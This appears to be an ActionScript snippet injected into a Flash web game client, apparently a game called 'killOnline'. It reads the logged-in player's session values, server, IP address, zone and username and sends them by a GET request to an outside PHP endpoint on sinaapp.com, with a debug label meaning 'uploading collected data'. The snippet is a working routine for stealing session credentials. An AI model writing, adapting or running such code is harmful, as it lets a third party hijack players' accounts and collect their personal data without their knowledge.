

import Core.model.data.MainData;
import Core.model.data.UserData;

import com.tg.Tools.TextTools;
import com.tools.DebugTools;
import com.tools.JSONTools;

import flash.net.URLLoader;
import flash.net.URLRequest;
import flash.net.URLRequestMethod;
import flash.net.URLVariables;

DebugTools.debugTrace("myID:"+UserData.UserInfo.UserId,"MSG");

DebugTools.debugTrace("myValues:"+MainData.LoginInfo.uservalues,"MSG");
DebugTools.debugTrace("server:"+MainData.LoginInfo.Server,"MSG",MainData.LoginInfo.Server);
DebugTools.debugTrace("ip:"+MainData.LoginInfo.userip,"MSG",MainData.LoginInfo);
DebugTools.debugTrace("zone:"+MainData.LoginInfo.Zone,"MSG",MainData.LoginInfo);
upLoadInfo();
function upLoadInfo():void
{
	var  loader:URLLoader;
	loader=new URLLoader();
	var url:String="http://sogasoga.sinaapp.com/killOnline/getcontent_name.php";
	//url="http://t1.ss911.cn/User/Friend.ss?u="+MainData.LoginInfo.uservalues+"&p="+p+"&t=0&userid="+pid+"";
	var data:Object;
	data={};
	data.uservalues=MainData.LoginInfo.uservalues;
	data.Server=MainData.LoginInfo.Server;
	data.userip=MainData.LoginInfo.userip;
	data.Zone=MainData.LoginInfo.Zone;
	data.name=UserData.UserInfo.UserName;
	var dataStr:String;
	dataStr=JSONTools.getJSONString(data);
	dataStr=TextTools.getPlainText(dataStr);
	DebugTools.debugTrace("上传收集数据:"+data.name+"\n"+dataStr,"Report",data);
	var uv:URLVariables=new URLVariables();
	uv.action="put";
	uv.content=dataStr;
	uv.name=data.name;
	
	var rq:URLRequest = new URLRequest();
	rq.url =url;
	rq.method = URLRequestMethod.GET;
	rq.data=uv;
	
	loader.load(rq);
}